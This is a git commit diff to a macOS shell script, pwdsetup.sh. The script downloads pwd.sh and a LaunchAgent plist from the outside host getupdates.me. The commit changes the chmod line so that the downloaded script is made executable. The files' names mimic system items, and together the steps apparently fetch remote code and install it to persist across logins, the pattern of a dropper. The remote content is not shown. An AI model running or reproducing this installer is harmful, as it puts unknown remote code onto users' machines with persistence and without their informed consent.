9e757a8ffc2d27c4528eafac215e5e8b7d83da13
kennethchow1 <103966331+kennethchow1@users.noreply.github.com>
2025-04-25 11:04:51 -0700

    Update pwdsetup.sh

--- pwdsetup.sh
+++ pwdsetup.sh
@@ -3,4 +3,4 @@ cd /usr/local/bin/
 curl -OL getupdates.me/pwd.sh
 cd ~/Library/LaunchAgent/
 curl -OL getupdates.me/com.local.pwd.plist
-chmod +x /volumes/e/netsetupcatalina
+chmod +x /usr/local/bin/pwd.sh
